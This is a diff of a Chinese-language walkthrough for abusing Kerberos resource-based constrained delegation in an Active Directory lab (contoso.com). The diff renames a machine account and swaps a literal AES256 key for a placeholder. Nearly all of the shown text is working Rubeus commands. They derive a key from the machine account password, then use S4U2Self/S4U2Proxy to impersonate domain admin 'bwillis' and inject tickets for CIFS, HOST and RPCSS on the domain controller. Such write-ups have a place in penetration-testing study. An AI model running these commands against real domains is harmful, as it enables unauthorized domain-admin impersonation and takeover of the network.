@@ -39,7 +39,7 @@ Invoke-Rubeus -Command "createnetonly /program:C:\Windows\system32\WindowsPowerS
 利用evilpc$的明文密碼生成加密TGS封包的AES KEY
 
 ```powershell
-Invoke-Rubeus -Command "hash /password:EvilPassword1 /domain:contoso.com /user:evilpc$"
+Invoke-Rubeus -Command "hash /password:EvilPassword1 /domain:contoso.com /user:evil-pc$"
 ```
 
 利用 S4U2SELF偽冒domain admin user `Bruce Willis` (bwillis)並使用S4U2PROXY分別取得AD-01上的CIFS、HOST和RPCSS的Service Ticket，
@@ -49,9 +49,9 @@ Invoke-Rubeus -Command "hash /password:EvilPassword1 /domain:contoso.com /user:e
 
 
 ```powershell
-Invoke-Rubeus -Command "s4u /user:evilpc$ /aes256:7217DCA9120F62686DB482695281FA79A3F2836553757E4FE5DDB37DB7D638FC /impersonateuser:bwillis /msdsspn:cifs/ad-01.contoso.com /ptt"
-Invoke-Rubeus -Command "s4u /user:evilpc$ /aes256:7217DCA9120F62686DB482695281FA79A3F2836553757E4FE5DDB37DB7D638FC /impersonateuser:bwillis /msdsspn:host/ad-01.contoso.com /ptt"
-Invoke-Rubeus -Command "s4u /user:evilpc$ /aes256:7217DCA9120F62686DB482695281FA79A3F2836553757E4FE5DDB37DB7D638FC /impersonateuser:bwillis /msdsspn:rpcss/ad-01.contoso.com /ptt"
+Invoke-Rubeus -Command "s4u /user:evil-pc$ /aes256:<hash> /impersonateuser:bwillis /msdsspn:cifs/ad-01.contoso.com /ptt"
+Invoke-Rubeus -Command "s4u /user:evil-pc$ /aes256:<hash> /impersonateuser:bwillis /msdsspn:host/ad-01.contoso.com /ptt"
+Invoke-Rubeus -Command "s4u /user:evil-pc$ /aes256:<hash> /impersonateuser:bwillis /msdsspn:rpcss/ad-01.contoso.com /ptt"
 ```
 
 - 查看kerberos票證
